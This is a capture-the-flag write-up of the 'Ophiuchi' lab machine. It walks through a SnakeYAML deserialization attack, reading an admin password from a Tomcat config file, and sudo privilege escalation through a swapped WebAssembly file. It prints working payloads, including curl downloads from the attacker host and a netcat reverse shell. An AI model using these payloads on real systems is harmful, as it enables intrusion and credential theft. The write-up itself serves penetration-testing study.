## Ophiuchi

Difficulty: Medium

### User Flag

#### Foothold

```
rustscan -a 10.10.10.227 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/636583c8-8c44-4a50-9b89-df58f364a145)

<br>

The website has a YAML Parser function. If we put correct data, we see the function is disabled by security reasons.  

If you put badly formatted data, we discover that the website is using snakeyaml behind it.

![website](https://github.com/b1d0ws/OSCP/assets/58514930/9059abb1-80d6-47b6-8f15-c821ae69d6e5)

![correctYAML](https://github.com/b1d0ws/OSCP/assets/58514930/43c4b2a6-2314-4d2f-b9b4-000a38156870)

![incorretYAML](https://github.com/b1d0ws/OSCP/assets/58514930/0ffa1797-89cc-4e37-9da5-1320ada38fca)

<br>

Searching for snakeyaml exploit, we find [this useful article](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) about deserilization.

![searchingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/aac2dff0-ff83-4765-8203-432b47998b46)

<br>

To exploit this RCE, we can use the method describe in [this github](https://github.com/artsploit/yaml-payload).

```
gedit src/artsploit/AwesomeScriptEngineFactory.java

Runtime.getRuntime().exec("curl http://10.10.14.11:8000/reverse.sh -o /tmp/reverse.sh");
Runtime.getRuntime().exec("bash /tmp/reverse.sh");

nano reverse.sh
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.11 7070 >/tmp/f

javac --release 8 src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf payload.jar -C src/ .

!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.11:8000/payload.jar"]
  ]]
]
```

![puttingCommand](https://github.com/b1d0ws/OSCP/assets/58514930/e81ed25f-bc44-4cf5-9fef-5d68aba0c235)

![exploitingRCE](https://github.com/b1d0ws/OSCP/assets/58514930/fdd08dbc-6335-4c17-8b4c-751eded4e94d)

![callingRCE](https://github.com/b1d0ws/OSCP/assets/58514930/b07c6aad-3f0c-423b-84f3-13dd8e6f7f54)

<br>

#### Admin User

You can find admin password inside /opt/tomcat/conf/tomcat-users.xml.

![tomcatUsers](https://github.com/b1d0ws/OSCP/assets/58514930/07591b93-4e03-4e79-808e-33a312e14fdc)

![adminPassword](https://github.com/b1d0ws/OSCP/assets/58514930/beb7bb32-04c5-4fb8-9e1c-02baddeb1edd)

<br>

### Root Flag

sudo -l indicates that we can run a go file. We need to reach the "else" part of the condition to execute deploy.sh.  

To do that, the variable f needs to be 1 and this depends on the main.wasm file.  

![sudo -l](https://github.com/b1d0ws/OSCP/assets/58514930/0eef416d-e494-4b77-b601-e6232cd78f8a)

There are two ways to do this.  

We can create a main.c file with "info" function returning 1 and convert to wasm.

```C
#include <emscripten.h>

EMSCRIPTEN_KEEPALIVE
int info() {
    return 1;
}
```

```
emcc main.c -o main.wasm -s EXPORTED_FUNCTIONS="['_info']" -s EXTRA_EXPORTED_RUNTIME_METHODS="['ccall']" --no-entry

sudo /usr/bin/go run /opt/wasm-functions/index.go
```

![rootWay1](https://github.com/b1d0ws/OSCP/assets/58514930/96c4ca81-634c-40f7-834f-9c03dded4d64)

<br>

Or use wasm (Web Assembly) tools to convert wasm to wat and edit this file to return 1.

```
wabt/bin/wasm2wat main.wasm -o main.wat
nano main.wat
wabt/bin/wat2wasm main.wat

sudo /usr/bin/go run /opt/wasm-functions/index.go
```

![wasm2wat](https://github.com/b1d0ws/OSCP/assets/58514930/1e8358e1-4cf5-4cfa-b102-70e0751a82f3)

![editingMainWasm](https://github.com/b1d0ws/OSCP/assets/58514930/da1f4086-066e-408f-aa02-b995a223b1b5)

![rootWay2](https://github.com/b1d0ws/OSCP/assets/58514930/7c007881-f26c-4cc3-96ec-0e0df34948eb)
